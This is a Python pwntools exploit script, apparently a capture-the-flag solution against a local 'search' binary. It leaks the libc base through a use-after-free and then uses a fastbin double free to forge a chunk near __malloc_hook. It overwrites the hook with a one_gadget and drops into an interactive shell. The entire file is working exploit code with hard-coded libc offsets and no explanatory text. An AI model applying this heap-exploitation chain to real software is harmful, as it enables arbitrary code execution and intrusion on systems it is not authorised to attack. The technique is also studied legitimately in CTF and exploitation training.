from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./search"
search = context.binary
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./search")
log.info('PID: ' + str(proc.pidof(p)[0]))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(p)

def index_sentence(s):
    p.recvuntil("3: Quit\n")
    p.sendline('2')
    p.recvuntil("Enter the sentence size:\n")
    p.sendline(str(len(s)))
    p.send(s)


def search_word(word):
    p.recvuntil("3: Quit\n")
    p.sendline('1')
    p.recvuntil("Enter the word size:\n")
    p.sendline(str(len(word)))
    p.send(word)


# leak
payload = 'a' * 0xa0 + ' b'
index_sentence(payload)
search_word('b')
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('y')
search_word('\x00')
p.recvuntil('Found ' + str(len(payload)) + ': ')
unsortedbin_addr = u64(p.recv(8))
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('n')
log.info("leak unsorted_bin address:" + hex(unsortedbin_addr))
unsortedbin_offset = 0x3c4b78
libc_base = unsortedbin_addr - unsortedbin_offset
log.success("libc base address:" + hex(libc_base))
# double free
payload = 'a' * 0x60 + ' d'
index_sentence(payload)
payload = 'b' * 0x60 + ' d'
index_sentence(payload)
payload = 'c' * 0x60 + ' d'
index_sentence(payload)
search_word('d')
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('y')
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('y')
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('y')  # fastbin:a->b->c->NULL
search_word('\x00')
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('y')
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('n')	# b->a->b
p.recvuntil('Delete this sentence (y/n)?\n')
p.sendline('n')	# b->a->b
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info("malloc_hook at:" + hex(malloc_hook))
raw_input()
fake_chunk = libc_base + 0x3c4aed	#find fake chunk(size=0x7f)
log.info("fake chunk around malloc_hook at:" + hex(fake_chunk))
payload = p64(fake_chunk) + 'e' * 0x60
index_sentence(payload)	# write malloc_hook to b->fd
index_sentence('f' * 0x68)
index_sentence('g' * 0x68)
one_gadget = libc_base + 0xf02a4
log.info("one gadget at:" + hex(one_gadget))
payload = 0x13 * 'h' +p64(one_gadget)
payload = payload.ljust(0x60)
raw_input()
index_sentence(payload)	#write gadget to malloc_hook

p.interactive()
